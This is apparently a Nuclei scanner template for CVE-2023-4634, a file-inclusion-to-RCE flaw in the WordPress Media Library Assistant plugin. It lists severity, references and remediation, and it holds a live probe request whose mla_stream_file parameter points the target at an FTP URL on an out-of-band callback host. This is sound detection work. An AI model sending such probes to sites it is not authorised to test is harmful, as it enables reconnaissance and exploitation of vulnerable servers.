id: CVE-2023-4634

info:
  name: Media Library Assistant < 3.09 - Remote Code Execution/Local File Inclusion
  author: Pepitoh,ritikchaddha
  severity: critical
  description: |
    A vulnerability in the Wordpress Media-Library-Assistant plugins in version < 3.09 is vulnerable to a local file inclusion which leading to RCE on default Imagegick installation/configuration.
  remediation: Fixed in version 3.09
  reference:
    - https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/
    - https://fr.wordpress.org/plugins/media-library-assistant/advanced/
    - https://cve.report/CVE-2023-4634
    - https://packetstormsecurity.com/files/174508/wpmla309-lfiexec.tgz
    - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2955933%40media-library-assistant&new=2955933%40media-library-assistant&sfp_email=&sfph_mail=#file4
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-4634
    cwe-id: CWE-73
    epss-score: 0.01945
    epss-percentile: 0.87402
    cpe: cpe:2.3:a:davidlingren:media_library_assistant:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: davidlingren
    product: media_library_assistant
    framework: wordpress
    publicwww-query: "wp-content/plugins/media-library-assistant"
  tags: packetstorm,cve,cve2023,wordpress,wp,wp-plugin,lfi,rce,media-library-assistant

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/media-library-assistant/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://{{interactsh-url}}/patrowl.svg"

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "Media Library Assistant"

      - type: word
        part: interactsh_protocol
        words:
          - "dns"

# digest: 4a0a0047304502207e2b432a0cce97f15920fc3d80bc9feb43b3fb9d6b14b65ad8ec379ba09ae904022100cd40cf0e4ba46686755813c3e4b533bf96f39aea29cf92c3fb15eeb718cec738:922c64590222798bb761d5b6d8e72950
